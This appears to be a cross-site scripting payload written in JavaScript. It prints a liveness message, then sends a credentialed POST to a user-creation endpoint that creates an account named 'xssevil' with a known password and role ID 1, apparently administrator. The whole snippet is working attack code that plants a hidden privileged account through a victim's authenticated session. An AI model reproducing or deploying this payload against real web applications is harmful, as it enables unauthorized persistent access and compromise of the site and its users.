console.log("yeah im alive")
fetch("/Users/Users/Create", {
    "headers": {
        "content-type": "application/json",
    },
    "body": JSON.stringify(
        {
            "userModel": {
                "UserId": -1,
                "Login": "xssevil",
                "Pass": "xssevil",
                "FirstName": "evil",
                "LastName": "evil",
                "RoleId": 1,
                "Access": [],
                "NoAccess": [],
                "LocationsRoles": null,
                "IsDomainAccount": false,
                "DomainId": 0
            }
        }
        ),
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
});
